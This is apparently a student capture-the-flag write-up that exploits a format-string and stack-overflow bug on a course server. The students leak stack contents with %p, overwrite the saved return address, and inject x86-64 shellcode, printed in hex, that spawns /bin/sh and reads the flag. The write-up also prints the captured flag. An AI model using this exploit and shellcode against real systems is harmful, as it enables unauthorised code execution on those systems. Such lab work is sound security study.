# Writeup
s1049877 Jakob Udovic
s1045403 Daan

```shell
$ echo "$(perl -e 'print "0"x103')" | nc hackme.rded.nl 27408
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

```

Buffer is 103 Bytes big. With printing 104 Bytes we get weird output at the end:
```shell
$ echo "$(perl -e 'print "0"x104')" | nc hackme.rded.nl 27408
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000�����
```


We can inspect the stack with 34 %p:
```shell
$ ./attack.sh 34
Attackstring is 101 bytes
0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025 0x7fffffffebd0 0x7fffffffec60 0x555555555236 0x7fffffffecc8 0x100000000 0x7fffffffec70 0x55555555524f 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffecb0 0 0xf8 0x7ffff7ffdd48 0x55555555509e 0x1
```


```shell
echo "$(perl -e 'print "%p "x60'; ./shellcode list 10)" | nc hackme.rded.nl 27408 
* [DEBUG] ./shellcode printed 43 bytes
0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7fffffffebe0 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x9090909020702520 0x3148909090909090 0x2f2fbb48d23148c0 0xc148736c2f6e6962 0x5752e789485308eb 0x50f3bb0e68948 0x1 0x7fffffffeeb0�����
```

Lecture at 45:00
We need the exact size of the buffer, because gets returns the addres which we need to override. Our buffer is of the size 103, we believe.

Here, I sucessfully injected BADC0DE inside stack:
```shell
$ ./attack.sh 25 0xBADC0DE
Attackstring is 79 bytes
0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0xbadc0de207025 0 0 0 0x7fffffffebe0 0x7fffffffec70 0x555555555236 0x7fffffffecd8 0x100000000 0x7fffffffec80 0x55555555524f ���
```

On stack we see:
`0x7fffffffebe0 0x7fffffffec70 0x555555555236`
Last 2 variables are frame pointer and return address.

We want to write our address to the address of the return address (last var):
```shell
$ ./attack.sh 24 0x7fffffffabcd 39
Attackstring is 118 bytes
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x7878787878787878 0x7878787878787878 0x7878787878787878 0x7878787878787878 0x7878787878787878 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x7fffffffebd0 0x7fffffffabcd 0x555555555236
```

With the offset of 39 x-s I've managed to override the frame pointer.
With 47 I will manage to override the return address. But I need something that actually works (a real address) that is on the stack.

Ok things are getting weird.
Now I don't know why we are using the x-s before our address. Thom just says on the Leacture it was an very lucky guess. I don't like this. Right now I'm more brute forcing than thinking what is going on...

%: 25
p: 70
 : 20

257010
source: https://onlineutf8tools.com/convert-utf8-to-bytes



I've managed to override the first return address:

```shell
$ ./attack.sh 32 0x7fffffffebd0 15
Attackstring is 118 bytes
xxxxxxxxxxxxxxxx0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x7878787878787878 0x7878787878787878 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x7fffffffebd0 0x7fffffffebd0 0x555555555236 0x7fffffffecc8 0x100000000 0x7fffffffec70 0x55555555524f 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffecb0 
```

```shell
$ ./attack.sh 32 0x7fffffffebd0 23
Attackstring is 126 bytes
xxxxxxxxxxxxxxxxxxxxxxxx0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x7878787878787878 0x7878787878787878 0x7878787878787878 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7fffffffebd0 0x2070252070252070 0x7fffffffebd0 0x7fffffffecc8 0x100000000 0x7fffffffec70 0x55555555524f 0x1 0x7ffff7f851f5�����
```
In the first attack I've overriden the frame pointer (no crash) and in the second the return address 0x555555555236.

This is our holy address we want our code to start at:
`0x7fffffffebd0`

Override the address itself:
```shell
$ ./attack.sh 24 0x7fffffffebd0 31
Attackstring is 110 bytes
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7fffffffebd0 0x7fffffffec60 0x555555555236 0x7fffffffecc8 0x100000000 0x7fffffffec70 �����
```


This is frame pointer (1 address before return address) overriden:
```shell
$ ./attack.sh 24 0x7fffffffebd0 39
Attackstring is 118 bytes
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x7fffffffebd0 0x7fffffffebd0 0x555555555236 
```

And I believe with another 8B of offset we override 1st return address:
```shell
$ ./attack.sh 24 0x7fffffffebd0 47
Attackstring is 126 bytes
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7fffffffebd0�����
```

Now we can see also a lot of "41"s on stack, these are the A-s I've spammed as offset. (We could also do $ ./attack.sh 39 0x7fffffffebd0 2 ?)
The string is 126B long (we need to remember this).


Shell code is 33B long:

```shell
$ ./shellcode list
* [DEBUG] ./shellcode printed 33 bytes
H1�H1�H�//bin/lsH�SH��RWH��
```

For better readability (no NOPs):
```shell
$ ./shellcode list | xxd
* [DEBUG] ./shellcode printed 33 bytes
00000000: 4831 c048 31d2 48bb 2f2f 6269 6e2f 6c73  H1.H1.H.//bin/ls
00000010: 48c1 eb08 5348 89e7 5257 4889 e6b0 3b0f  H...SH..RWH...;.
00000020: 05                                       .
```

And with offset 10 NOPs:
```shell
$ ./shellcode list 10 | xxd* [DEBUG] ./shellcode printed 43 bytes
00000000: 9090 9090 9090 9090 9090 4831 c048 31d2  ..........H1.H1.
00000010: 48bb 2f2f 6269 6e2f 6c73 48c1 eb08 5348  H.//bin/lsH...SH
00000020: 89e7 5257 4889 e6b0 3b0f 05              ..RWH...;..
```
47 is number of our bytes for offset, 33 is the len of shell code so we need 14B of NOP operations
47 - 33 = 14
```shell
$ ./attack.sh 24 0x7fffffffebd0 15
* [DEBUG] ./shellcode printed 48 bytes
Attackstring is 126 bytes
���������������H1�H1�H�//bin/lsH�SH��RWH��;0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x9090909090909090 0x4890909090909090 0x2fbb48d23148c031 0x48736c2f6e69622f 0x52e789485308ebc1 0x50f3bb0e6894857 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7fffffffebd0�����
FLAG
bin
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
src
srv
sys
tmp
usr
var
```


And if my math works, we could transform 15 NOPs in 5 more "%p "-s. So 24 + 15 = 39
```shell
$ ./attack.sh 39 0x7fffffffebd0 0
* [DEBUG] ./shellcode printed 33 bytes
Attackstring is 156 bytes
H1�H1�H�//bin/lsH�SH��RWH��;0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0xbb48d23148c03148 0x736c2f6e69622f2f 0xe789485308ebc148 0xf3bb0e689485752 0x2520702520702505 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7fffffffebd0 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0xebd0207025207025�����
```

For some reason this doesn't work...

--------------------------------------------------------------------------------


Anyway, off to the shell commmand:

Shell command has the same length as the list command.

```shell
$ ./attack.sh 24 0x7fffffffebd0 15
* [DEBUG] ./shellcode printed 48 bytes
Attackstring is 126 bytes
���������������H1�H1�H�//bin/shH�SH��RWH��;0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x9090909090909090 0x4890909090909090 0x2fbb48d23148c031 0x4868732f6e69622f 0x52e789485308ebc1 0x50f3bb0e6894857 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7fffffffebd0�����
whoami
nobody

cat /FLAG     
HiCCTF{ysiqJobnbaFNZyaBHaKkVBw6u4aiXvtAbQSSC6adxNb55LvJ70o6YtXycSvuTSkE}
```

At the end I just transformed my offset of 15 to 5 more "%p "-s and ran it with the command:
`./attack.sh 29 0x7fffffffebd0 0`

Jakob Udovic.
s1049877